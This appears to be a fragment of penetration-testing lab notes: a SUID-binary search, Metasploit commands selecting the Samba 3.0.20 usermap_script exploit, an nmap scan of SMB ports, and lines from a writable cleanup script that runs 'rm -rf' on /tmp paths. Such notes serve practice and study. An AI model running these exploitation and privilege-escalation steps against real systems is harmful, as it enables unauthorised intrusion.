find / -perm -u=s -type f 2>/dev/null
search Samba 3.0.20
use exploit/multi/samba/usermap_script
nmap -T4 -A -p 139,445 
139/tcp netbios-ssn
echo "Running cleanup script: nothing to delete" >> /var/ftp/scripts/remove
rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp $LINE" 
